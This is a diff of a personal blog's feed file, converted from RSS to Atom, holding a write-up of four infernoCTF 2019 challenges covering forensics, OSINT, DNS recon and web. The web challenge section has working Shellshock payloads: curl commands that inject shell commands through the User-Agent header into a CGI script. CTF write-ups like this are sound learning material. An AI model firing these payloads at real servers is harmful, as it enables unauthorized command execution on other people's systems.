@@ -1,32 +1,22 @@
-<?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>mirai</title>
-    <description></description>
-    <link>http://localhost:4000</link>
-    
-      
-        <item>
-          <title>infernoCTF 2019</title>
-          <description>&lt;h1 id=&quot;merry-christmas-forensic-200&quot;&gt;Merry Christmas (Forensic, 200)&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-11-16T15:02:14+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">mirai</title><entry><title type="html">infernoCTF 2019</title><link href="http://localhost:4000/2019/12/28/inferno-ctf-2019" rel="alternate" type="text/html" title="infernoCTF 2019" /><published>2019-12-28T18:34:17+08:00</published><updated>2019-12-28T18:34:17+08:00</updated><id>http://localhost:4000/2019/12/28/inferno-ctf-2019</id><content type="html" xml:base="http://localhost:4000/2019/12/28/inferno-ctf-2019">&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h1 id=&quot;merry-christmas-forensic-200&quot;&gt;Merry Christmas (Forensic, 200)&lt;/h1&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
 &lt;p&gt;OSINT is the way
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
 
 &lt;p&gt;We were given a zip file named &lt;code class=&quot;highlighter-rouge&quot;&gt;output.zip&lt;/code&gt; and a hint &lt;code class=&quot;highlighter-rouge&quot;&gt;What is mrT4ntr4's last name?&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;Most probably the password of the zip file is mrT4ntr4’s last name. So let’s search it over the internet.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_05-48-27.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;After extracting the zip file with a password “Malhotra”, there’s this file named &lt;code class=&quot;highlighter-rouge&quot;&gt;flag.gif&lt;/code&gt;. Did some check on the gif file and foundout that the header was modified.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_05-57-28.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The file signature for GIF file should be like this &lt;strong&gt;47 49 46 38 37 61&lt;/strong&gt; or &lt;strong&gt;47 49 46 38 39 61&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_05-48-27.png&quot; alt=&quot;nice&quot; /&gt;
+&lt;br /&gt;
+After extracting the zip file with a password “Malhotra”, there’s this file named &lt;code class=&quot;highlighter-rouge&quot;&gt;flag.gif&lt;/code&gt;. Did some check on the gif file and foundout that the header was modified.
+&lt;br /&gt;
+&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_05-57-28.png&quot; alt=&quot;nice&quot; /&gt;
+&lt;br /&gt;
+The file signature for GIF file should be like this &lt;strong&gt;47 49 46 38 37 61&lt;/strong&gt; or &lt;strong&gt;47 49 46 38 39 61&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;Fixing the modified header to its original will give us the flag!&lt;/p&gt;
 
@@ -36,51 +26,48 @@
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;infernoCTF{M3RRy_ChR1stmAs}&lt;/code&gt;&lt;/p&gt;
 
-&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
-
+&lt;hr /&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;h1 id=&quot;we-will-we-will-shock-you-web-150&quot;&gt;We will we will Shock You (Web, 150)&lt;/h1&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;h3 id=&quot;description-1&quot;&gt;Description&lt;/h3&gt;
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://104.197.168.32:17012/index.html&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;h3 id=&quot;solution-1&quot;&gt;Solution&lt;/h3&gt;
 
 &lt;p&gt;The title itself gives me an idea that maybe it’s a shellshock bash bug.&lt;/p&gt;
 
-&lt;p&gt;Checking the source code of the website gives me this file &lt;code class=&quot;highlighter-rouge&quot;&gt;bashferno.cgi&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_06-15-42.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Checking the source code of the website gives me this file &lt;code class=&quot;highlighter-rouge&quot;&gt;bashferno.cgi&lt;/code&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_06-15-42.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Ok lets try to get that flag using shellshock exploit.&lt;/p&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;curl -H “user-agent: () { :; }; echo; echo; /bin/ls” http://104.197.168.32:17012/bashferno.cgi&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_06-20-42.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;cat’ting the txt file will give us the flag&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -H &quot;user-agent: () { :; }; echo; echo; /bin/ls&quot; http://104.197.168.32:17012/bashferno.cgi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_06-20-42.png&quot; alt=&quot;nice&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+cat’ting the txt file will give us the flag&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -H &quot;user-agent: () { :; }; echo; echo; /bin/cat flag_for_this_INFERNO.txt&quot; http://104.197.168.32:17012/bashferno.cgi
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;reading the text file will give us the flag.&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;
+reading the text file will give us the flag.&lt;/p&gt;
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;infernoCTF{F33l_Th3_Sh0ck}&lt;/code&gt;&lt;/p&gt;
 
-&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
-
+&lt;hr /&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;h1 id=&quot;check-again-200&quot;&gt;Check Again (200)&lt;/h1&gt;
-&lt;h3 id=&quot;description-2&quot;&gt;Description&lt;/h3&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;description-2&quot;&gt;Description&lt;/h4&gt;
 &lt;p&gt;&lt;em&gt;Did you check the site , I mean check again.&lt;/em&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;h3 id=&quot;solution-2&quot;&gt;Solution&lt;/h3&gt;
 
-&lt;p&gt;We we’re given a text file named &lt;code class=&quot;highlighter-rouge&quot;&gt;Openit&lt;/code&gt; and a hint &lt;code class=&quot;highlighter-rouge&quot;&gt;Dante Nero Sparda are the true demons.&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Checking the text file give me this lol&lt;/p&gt;
+&lt;p&gt;We we’re given a text file named &lt;code class=&quot;highlighter-rouge&quot;&gt;Openit&lt;/code&gt; and a hint &lt;code class=&quot;highlighter-rouge&quot;&gt;Dante Nero Sparda are the true demons.&lt;/code&gt;
+&lt;br /&gt;&lt;br /&gt;
+Checking the text file give me this lol&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;Check Again!!!&lt;/p&gt;
@@ -90,27 +77,29 @@
   &lt;p&gt;Press Home Btn.&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;p&gt;As you can see in the hint &lt;code class=&quot;highlighter-rouge&quot;&gt;D&lt;/code&gt;ante &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;ro &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt;parda are the true demons.&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;
+As you can see in the hint &lt;code class=&quot;highlighter-rouge&quot;&gt;D&lt;/code&gt;ante &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;ro &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt;parda are the true demons.&lt;/p&gt;
 
-&lt;p&gt;So okay, we need to check the DNS of the website.&lt;/p&gt;
-
-&lt;p&gt;I used &lt;a href=&quot;https://github.com/darkoperator/dnsrecon&quot;&gt;dnsrecon&lt;/a&gt; for this.&lt;/p&gt;
+&lt;p&gt;So okay, we need to check the DNS of the website.
+&lt;br /&gt;&lt;br /&gt;
+I used &lt;a href=&quot;https://github.com/darkoperator/dnsrecon&quot;&gt;dnsrecon&lt;/a&gt; for this.&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnsrecon -d infernoctf.live -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_06-39-08.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_06-39-08.png&quot; alt=&quot;nice&quot; /&gt;
+&lt;br /&gt;
+As you can see on the SPF and TXT, the flag is shown. 
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;infernoCTF{N1c3_Pl4c3_70_h1d3_1n_th3_Rec0rds}&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;infernoCTF{N1c3_Pl4c3_70_h1d3_1n_th3_Rec0rds}&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
-
+&lt;hr /&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;h1 id=&quot;whistle-blower-osint-226&quot;&gt;Whistle Blower (OSINT, 226)&lt;/h1&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;h3 id=&quot;description-3&quot;&gt;Description&lt;/h3&gt;
 &lt;p&gt;&lt;em&gt;After playing some 2048 you come across an interesting email exchange… What could it lead to?&lt;/em&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;h3 id=&quot;solution-3&quot;&gt;Solution&lt;/h3&gt;
 &lt;p&gt;Cheking the file &lt;code class=&quot;highlighter-rouge&quot;&gt;employment_status.mbox&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Gmail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Sent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Opened&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;leak&lt;/span&gt;
@@ -149,8 +138,8 @@ Please talk to HR ASAP.
 
 - Angry Employer
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This line &lt;code class=&quot;highlighter-rouge&quot;&gt;Hope you like being the center of attention on infosec twitter!&lt;/code&gt; gives me an idea. Let’s find something useful on twitter!&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;
+This line &lt;code class=&quot;highlighter-rouge&quot;&gt;Hope you like being the center of attention on infosec twitter!&lt;/code&gt; gives me an idea. Let’s find something useful on twitter!&lt;/p&gt;
 
 &lt;p&gt;Tried searching &lt;code class=&quot;highlighter-rouge&quot;&gt;imdeveloper123&lt;/code&gt; on twitter and it leads me to this account &lt;a href=&quot;https://twitter.com/imdeveloper123&quot;&gt;@imdeveloper123&lt;/a&gt;&lt;/p&gt;
 
@@ -160,17 +149,4 @@ Please talk to HR ASAP.
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;infernoCTF{y0u_f0und_7h3_d1sgrun7l3d_empl0y33!}&lt;/code&gt;&lt;/p&gt;
 
-&lt;hr /&gt;
-
-&lt;p&gt;That’s a wrap! Thank you for reading. Just finished 109th with 786 pts&lt;/p&gt;
-
-&lt;p&gt;Badly need more time to learn crypto, pwn and reverse engineering.&lt;/p&gt;
-</description>
-          <pubDate>2019-12-28T18:34:17+08:00</pubDate>
-          <link>http://localhost:4000/inferno-ctf-2019</link>
-          <guid isPermaLink="true">http://localhost:4000/inferno-ctf-2019</guid>
-        </item>
-      
-    
-  </channel>
-</rss>
+&lt;hr /&gt;</content><author><name></name></author><category term="CTF" /><category term="writeups" /><category term="ctf" /><category term="catch the flag" /><summary type="html">Merry Christmas (Forensic, 200) Description OSINT is the way Solution</summary></entry></feed>
